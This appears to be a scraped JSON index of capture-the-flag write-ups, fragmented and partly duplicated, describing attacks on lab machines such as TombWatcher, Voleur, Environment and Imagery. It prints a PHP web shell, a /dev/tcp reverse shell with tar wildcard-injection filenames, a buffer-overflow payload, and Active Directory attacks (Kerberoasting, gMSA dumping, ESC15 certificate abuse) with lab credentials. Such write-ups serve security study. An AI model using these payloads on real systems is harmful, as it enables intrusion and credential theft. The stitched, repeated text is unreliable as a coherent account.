out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

This time we upload any valid image and then click Transform Image (for example, “crop”), intercepting that request in Burp Suite.\nThe next step is to inject a Reverse Shell into a field that should only contain numbers, so the server executes it and gives us remote access.\nPrivilege escalation to Mark Now that we’re in as the user web, the next step is to run LinPEAS to search for escalation vectors: SUID/weak permissions, credentials in files, misconfigured services, and scheduled tasks we can abuse.\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We find an encrypted backup that could contain credentials or sensitive data from what appears to be the website.\nWe bring it to our local machine and see it was encrypted using pyAesCrypt. To decrypt it we use pyAesDecrypt, which allows a dictionary attack to find the password.\nWe decompress the file and inside find the website backup. When we read db.json this time, it also contains the encrypted password for user mark, so we again use hashcat to crack it.\nhashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt We log in as user Mark and obtain the User Flag.\nPrivilege escalation to Root Running sudo -l shows we can run the binary charcol as root without providing a password.\nExecuting it reveals a program for performing backups. There is a shell option where we can run several commands to perform different functions.\nWhen we enter help it lists several commands we can run and a brief explanation of how to use them.\nOne of these commands is particularly useful: it can create cron jobs. Since we can run this program as root, we create a cron job that copies the Root Flag to a file called pwned.txt in /tmp and sets permissions so we can finally read the flag.\nauto add --schedule \u0026#34;* * * * *\u0026#34; --command \u0026#34;cp /root/root.txt /tmp/pwned.txt \u0026amp;\u0026amp; chmod 777 /tmp/pwned.txt\u0026#34; --name \u0026#34;pwned\u0026#34; Machine completed!!\n","permalink":"http://localhost:1313/writeups/medium/imagery/","summary":"Difficulty: Medium 🟠","title":"Imagery - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/immortal/","summary":"Difficulty: Medium 🟠","title":"Immortal - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/very-easy/injection/","summary":"Difficulty: Very Easy 🔵","title":"Injection - Dockerlabs"},{"content":"\rMachine Link\nTo find the IP of the victim machine, I use the arp-scan command to discover the devices connected to my local network and locate the one whose** MAC address** starts with 08:, indicating it is a VirtualBox virtual machine.\nsudo arp-scan -I eth0 --localnet Next, we proceed with a quick scan using NMAP to see which ports are open.\nsudo nmap -sS --min-rate 4500 -n -Pn 192.168.18.163 Ports 22 and 80 are open\rAnd now we perform a more detailed scan on those open ports and save the result in a file called target.txt.\nnmap -sCV -p22,80 -n -Pn 192.168.18.163 -oN target.txt Detailed scan of the open ports\rWe observe a website hosted on this machine via port 80, but only the default Nginx homepage is visible.\nI use Gobuster to enumerate hidden files and directories.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t 